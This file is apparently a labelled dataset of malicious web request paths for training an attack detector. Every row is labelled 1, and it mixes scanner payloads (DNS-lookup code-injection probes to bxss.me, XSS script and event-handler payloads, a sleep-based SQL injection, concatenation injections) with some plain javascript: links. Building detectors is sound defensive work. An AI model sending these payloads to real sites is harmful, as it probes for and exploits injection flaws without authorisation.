sentences	labels
socket.gethostbyname(""hithn"" ""iwcyplpfd267b.bxss.me."")[3].to_s) ""/***************/16/images/jquery.waterfall.js 	 1
socket.gethostbyname('hitqx' 'wcagrvvk4d467.bxss.me.')[3].to_s) '/****/7/12/art_35_234319.html 	 1
/******/system/2021/11/27/javascript:void(); 	 1
socket.gethostbyname('hitnp' 'sttuplrk424a2.bxss.me.')[3].to_s) '/**/images/autocomplete.css 	 1
/******/hhs/js/jquery.kinslideshow-1.2.1.min.js/""><script>alert(34)</script> 	 1
socket.gethostbyname(""hitld"" ""rwoptjvibaac2.bxss.me."")[3].to_s) ""/******/waterpull/pinterest_grid.js 	 1
/******/hhs/js/jquery-1.4a2.min.js/<img src="javascript:alert(50)"> 	 1
socket.gethostbyname('hitjq' 'zaycmiwga6fb9.bxss.me.')[3].to_s) '/*****/grouppic/jquery.ad-gallery.js 	 1
socket.gethostbyname(""hitde"" ""mluirsua1ba1e.bxss.me."")[3].to_s) ""/****/10/11/art_34_242318.html 	 1
socket.gethostbyname('hitcx' 'aetwgyshf3a9b.bxss.me.')[3].to_s) '/******/result.css 	 1
socket.gethostbyname('hitmx' 'htrncijocc232.bxss.me.')[3].to_s) '/******/zmhdyc.html 	 1
socket.gethostbyname('hitoi' 'kglbxleaf7bf3.bxss.me.')[3].to_s) '/**/art_34_242318.html 	 1
socket.gethostbyname(""hitvw"" ""svhrikna978d3.bxss.me."")[3].to_s) ""/***/easyui/plugins/jquery.panel.js 	 1
/******/system/2016/12/05/javascript:void(); 	 1
socket.gethostbyname(""hitvv"" ""tkecydzod2611.bxss.me."")[3].to_s) ""/***************/16/images/plugin/voice/hzrecorder.js 	 1
socket.gethostbyname('hitds' 'whdyamzq0c405.bxss.me.')[3].to_s) '/****/gdyx/ 	 1
/******/system/2018/02/25/javascript:window.print() 	 1
socket.gethostbyname(""hitih"" ""odvykjbx400e4.bxss.me."")[3].to_s) ""/****/110105008056111/16/images/plugin/voice/hzrecorder.js 	 1
/******/system/2020/10/01/javascript:void(0); 	 1
socket.gethostbyname('hitqp' 'lpnyaahv5ffcc.bxss.me.')[3].to_s) '/****/202011/t20201106_2279316.html 	 1
/******/system/2021/06/09/013399706'""/><script >alert(2291);</script >.shtml 	 1
/******/zsn/index.html/"><script>alert(334)</script> 	 1
socket.gethostbyname(""hitbp"" ""hprmrvybad890.bxss.me."")[3].to_s) ""/****/bmjs/qtdw/ 	 1
/******/n236753/n236781/c1556969'||'/content.html 	 1
/******/n42746/index'||'_244329_10.html 	 1
socket.gethostbyname(""hitbz"" ""lgqjbofgbf0de.bxss.me."")[3].to_s) ""/******/tjj/zfxxgkml_2127/hygq_2064/list.html 	 1
socket.gethostbyname(""hithx"" ""idvruowtd5dcb.bxss.me."")[3].to_s) ""/*****/voice.css 	 1
/******/lxqz/jb/"><script>alert(553)</script> 	 1
socket.gethostbyname('hitkd' 'fwxpzvdva57f3.bxss.me.')[3].to_s) '/****/list.html 	 1
/******/system/2016/02/29/javascript:window.close(); 	 1
/******/system/2016/03/02/javascript:window.print() 	 1
socket.gethostbyname('hitwv' 'asaulhyx94a73.bxss.me.')[3].to_s) '/*****/hfswsj/zmhdyc.html 	 1
socket.gethostbyname(""hitel"" ""crzuykif4f453.bxss.me."")[3].to_s) ""/***************/16/images/result.css 	 1
socket.gethostbyname('hitrf' 'rslqqevdca891.bxss.me.')[3].to_s) '/*******/jquery.panel.js 	 1
socket.gethostbyname('hitvc' 'qjhngaqfacbb7.bxss.me.')[3].to_s) '/**/images/main.css 	 1
socket.gethostbyname('hityg' 'axrimmwsd2d4d.bxss.me.')[3].to_s) '/******/searchbtn.js 	 1
socket.gethostbyname(""hityi"" ""rhekvivta103e.bxss.me."")[3].to_s) ""/******/ie6fixed/ie6fixed.js 	 1
/******/system/2019/08/27/javascript:window.print() 	 1
/******/lxqz/cx/"><script>alert(561)</script> 	 1
/******/system/2017/12/20/javascript:window.close(); 	 1
/******/system/2021/11/26/javascript:window.close(); 	 1
socket.gethostbyname(""hitla"" ""rrwjekob50e43.bxss.me."")[3].to_s) ""/**/widgets/scrollup/css/themes/image.css 	 1
/******/system/2021/09/13/javascript:window.print() 	 1
socket.gethostbyname(""hitxj"" ""smoajdhua2d6f.bxss.me."")[3].to_s) ""/********/jcse/110105008056111/16/images/plugin/analysis/jquery.windstagball.js 	 1
/******/system/2021/06/09'"/><iframe src=javascript:alert(2331) /013399706.shtml 	 1
/******/system/2021/06/09'""/>/</script/>/<svg/onload=alert(2371) width=100//>/013399706.shtml 	 1
/******/system/2017/07/05/javascript:void(0); 	 1
socket.gethostbyname(""hitsi"" ""vqekvqfse01d8.bxss.me."")[3].to_s) ""/******/t20210806_185416.html 	 1
socket.gethostbyname('hitqw' 'qynnbxhm93ba7.bxss.me.')[3].to_s) '/**/images/catesearchbtn.js 	 1
socket.gethostbyname(""hitaj"" ""hnwgpuosb9993.bxss.me."")[3].to_s) ""/**/images/plugin/voice/hzrecorder.js 	 1
socket.gethostbyname(""hitwp"" ""cmjbbqhpe424a.bxss.me."")[3].to_s) ""/****/ 	 1
socket.gethostbyname(""hitgv"" ""atyepoqcfb626.bxss.me."")[3].to_s) ""/****/list.html 	 1
/******/system/2017/10/28/javascript:window.close(); 	 1
socket.gethostbyname('hitaf' 'xnpjzolz0be83.bxss.me.')[3].to_s) '/**/images/ui.css 	 1
/******/n42821/n42825/n1588869'||'/c1589219/content.html 	 1
/******/system/2018/01/28/javascript:window.close(); 	 1
/******/system/2016/12/19/javascript:window.print() 	 1
/******/system/2021/12/21/javascript:window.close(); 	 1
socket.gethostbyname('hitwm' 'urffjzqs11013.bxss.me.')[3].to_s) '/******/list.html 	 1
socket.gethostbyname('hitne' 'cqvoatbv27e82.bxss.me.')[3].to_s) '/******/index.html 	 1
/¦¯¡ä¡Áor(if(now()=sysdate(),sleep(15),0))xor'z/**/encrypt/jbase64.js 	 1
socket.gethostbyname(""hitkh"" ""ibbotibv8416c.bxss.me."")[3].to_s) ""/**/lib/easyui/plugins/jquery.window.js 	 1
socket.gethostbyname('hitxz' 'cryipehm45601.bxss.me.')[3].to_s) '/*******/jquery.linkbutton.js 	 1
socket.gethostbyname(""hithd"" ""erqdcurh149e4.bxss.me."")[3].to_s) ""/**/images/result.css 	 1
/******/system/2016/09/14/javascript:window.print() 	 1
